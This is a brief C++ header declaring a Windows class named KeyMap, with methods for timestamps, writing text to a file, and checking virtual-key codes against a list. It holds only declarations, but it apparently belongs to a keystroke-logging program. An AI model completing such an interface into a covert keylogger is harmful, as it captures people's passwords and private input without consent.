#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "KeyMap.h"
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <time.h>
#include <chrono>
#include <sys/stat.h>
#include <sstream>
class KeyMap
{

public:
	std::string GetTime();
	void WriteData(std::string Text);
	bool isKeyListed(int vKey);

};

